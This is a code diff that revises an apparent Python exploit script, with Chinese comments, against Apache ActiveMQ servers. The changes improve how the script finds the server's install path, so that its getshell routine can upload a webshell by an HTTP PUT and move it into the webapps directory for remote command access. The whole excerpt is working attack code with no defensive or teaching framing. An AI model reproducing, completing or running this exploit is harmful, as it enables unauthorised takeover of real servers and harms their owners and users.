@@ -97,7 +97,7 @@ Destination:#move_shell_path#
             sock.sendall(check_uer_package)
             time.sleep(3)
             recv = sock.recv(500)
-            # print recv
+            # print recv[0:200]
             if "HTTP/1.1 200 OK" in recv or "HTTP/1.1 404 Not Found" not in recv:
                 flag = True
             else:
@@ -109,6 +109,22 @@ Destination:#move_shell_path#
             print e
             sock.close()
 
+    #C:\switch-platform\apache-activemq-5.7.0\bin\win64\..\..
+    #/home/appusr/apache-activemq-5.8.0
+    def deal_path(self, install_path):
+        real_install_path = ""
+        tmppath = install_path
+        # linux系统
+        if ":" not in install_path:
+            real_install_path = tmppath
+        # win系统
+        else:
+            tmp_list = tmppath.split("\\")
+            range_index = len(tmp_list) - (tmppath.count("..")*2)
+            for k in range(0, range_index):
+                real_install_path = real_install_path + "\\"+tmp_list[k]
+            real_install_path = real_install_path[1:]
+        return real_install_path
 
     def getshell(self, url, username, password, shell_path):
         self.username = username
@@ -125,7 +141,6 @@ Destination:#move_shell_path#
         # 利用当前时间戳初始化put上传的文件名和获取的shell文件名
         self.init_shell_fie()
         self.put_file_path = self.base_url+self.put_file_path
-
         check_url = self.put_file_path
         shellcpntent = open(self.local_shell_path, 'r')
         # 替换下换行
@@ -170,21 +185,21 @@ Destination:#move_shell_path#
                     else:
                         recv = recv + recv_temp
                         continue
-            # 很笨的办法寻找安装目录，在html里面找
-            DirIndex = recv.index("LockFile.lock.")
-            endIndex = recv[DirIndex:].index("data")
-            tempIndex = recv[DirIndex+14:DirIndex+endIndex]
+            # 换一种寻找办法，使用activemq.home作为安装路径
+            DirIndex = recv.index("activemq.home")
+            endIndex = recv[DirIndex+19:].index("</td>")
+            tempIndex = recv[DirIndex+25:DirIndex+19+endIndex]
+            tempIndex = self.deal_path(tempIndex)
+            print u"[+]找到安装路径:" + tempIndex
         except:
             print u"寻找Web应用路径失败,请手动确认URL: {url}是否存在!!!!".format(url=get_install_path_url)
             return
         self.install_path = tempIndex
         path_list = self.install_path.split("\\")
         temp_shell_path = ""
-        if len(path_list)==1:
+        if len(path_list) == 1:
             path_list = self.install_path.split("/")
-            temp_shell_path = self.base_url +"/" +path_list[2]+"/"+path_list[3]+"/webapps"
-        else:
-            temp_shell_path = self.base_url +"/" +path_list[1]+"/"+path_list[2]+"/webapps"
+        temp_shell_path = self.base_url +"/" +path_list[1]+"/"+path_list[2]+"/webapps"
         # 得到MOVE_PATH
         print u"[+]最后一步,MOVE得到shell"
         for webshell_path in self.webshell_path_list:
